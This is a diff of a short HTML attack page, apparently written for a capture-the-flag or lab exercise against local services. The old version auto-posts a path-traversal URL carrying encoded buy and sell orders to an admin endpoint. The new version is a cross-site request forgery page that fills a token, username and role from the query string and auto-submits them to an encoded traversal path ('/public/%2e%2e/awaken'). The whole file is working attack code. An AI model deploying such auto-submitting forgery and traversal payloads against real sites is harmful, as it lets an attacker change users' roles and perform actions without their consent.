@@ -1,16 +1,26 @@
 <!doctype html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <title>Auto POST to admin.php</title>
-  </head>
-  <body>
-    <form id="f" method="POST" action="http://localhost:5000/admin.php">
-      <input type="hidden" name="url" value="http://localhost:5000/admin.php/../index.php?html=-%20amount%3A%202000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20BUY%0A-%20amount%3A%202000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20SELL%0A-%20amount%3A%201%0A%20%20currency%3A%20FL%0A%20%20op%3A%20BUY%0A">
-    </form>
+<meta charset="utf-8">
+<title>attack</title>
+<form id="f" action="" method="POST">
+  <input type="hidden" name="_csrf" id="csrf">
+  <input type="hidden" name="username" id="user">
+  <input type="hidden" name="role" id="role">
+  <button type="submit">Submit</button>
+</form>
+<script>
+  const qs = new URLSearchParams(location.search);
+  const token = qs.get('token') || '';
+  const user  = qs.get('user')  || 'guide_kid';
+  const role  = qs.get('role')  || 'guide';
+  const action= qs.get('action')|| 'http://127.0.0.1:3000/public/%2e%2e/awaken';
+  const auto  = qs.get('auto') ?? '1';
 
-    <script>
-      document.getElementById("f").submit();
-    </script>
-  </body>
-</html>
+  document.getElementById('csrf').value = token;
+  document.getElementById('user').value = user;
+  document.getElementById('role').value = role;
+  document.getElementById('f').action = action;
+
+  if (token && auto !== '0') {
+    setTimeout(() => document.getElementById('f').requestSubmit(), 300);
+  }
+</script>
